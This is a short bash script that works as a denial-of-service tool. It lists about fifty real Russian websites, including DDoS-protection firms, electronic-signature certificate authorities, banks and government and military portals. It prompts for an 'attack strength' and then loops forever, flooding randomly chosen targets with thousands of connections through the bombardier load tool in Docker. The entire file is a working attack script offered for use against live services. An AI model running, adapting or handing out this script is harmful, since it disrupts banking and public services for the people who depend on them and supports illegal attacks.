#!/bin/bash -x

DESTS=(
"https://ddos-guard.net/ru"
"https://stormwall.pro/"
"https://qrator.net/ru/"
"https://solidwall.ru/"
"https://iecp.ru/ep/ep-verification"
"https://iecp.ru/ep/uc-list"
"https://uc-osnovanie.ru/"
"http://www.nucrf.ru"
"http://www.belinfonalog.ru"
"http://www.roseltorg.ru"
"http://www.astralnalog.ru"
"http://www.nwudc.ru"
"http://www.center-inform.ru"
"https://kk.bank/UdTs"
"http://structure.mil.ru/structure/uc/info.htm"
"http://www.ucpir.ru"
"http://dreamkas.ru"
"http://www.e-portal.ru"
"http://izhtender.ru"
"http://imctax.parus-s.ru"
"http://www.icentr.ru"
"http://www.kartoteka.ru"
"http://rsbis.ru/elektronnaya-podpis"
"http://www.stv-it.ru"
"http://www.crypset.ru"
"http://www.kt-69.ru"
"http://www.24ecp.ru"
"http://kraskript.com"
"http://ca.ntssoft.ru"
"http://www.y-center.ru"
"http://www.rcarus.ru"
"http://rk72.ru"
"http://squaretrade.ru"
"http://ca.gisca.ru"
"http://www.otchet-online.ru"
"http://udcs.ru"
"http://www.cit-ufa.ru"
"http://elkursk.ru"
"http://www.icvibor.ru"
"http://ucestp.ru"
"http://mcspro.ru"
"http://www.infotrust.ru"
"http://epnow.ru"
"http://ca.kamgov.ru"
"http://mascom-it.ru"
"http://cfmc.ru"
"https://www.vtb.ru/"
"https://www.gazprombank.ru/"
"https://www.gosuslugi.ru/"
"https://www.mos.ru/uslugi/"
"http://kremlin.ru/"
"http://government.ru/"
)

TIME="360s"
ARR_LENGTH=${#DESTS[@]}

read -p 'Enter the strength of attack. 1 - 20+, depending on you internet speed:' CONNECTIONS

while TRUE
do
    RANDOMNUM=$((RANDOM % ARR_LENGTH ))
    DEST=${DESTS[$RANDOMNUM]}

    FULLCONNECTIONS=$((CONNECTIONS * 1000))
    docker run -ti --rm alpine/bombardier -c $FULLCONNECTIONS -d $TIME -l $DEST
done
